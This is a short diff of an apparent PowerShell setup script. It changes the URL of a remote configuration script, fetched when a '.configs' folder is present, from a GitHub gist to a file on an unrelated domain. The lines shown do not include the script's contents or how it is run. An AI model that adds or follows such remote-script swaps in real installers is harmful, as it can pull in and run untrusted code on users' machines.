@@ -600,7 +600,7 @@ try {
 
     if (Test-Path '.configs') {
         Write-StepLog 'Applying environment configuration'
-        $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
+        $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
 
         try {
             Enable-ModernTls
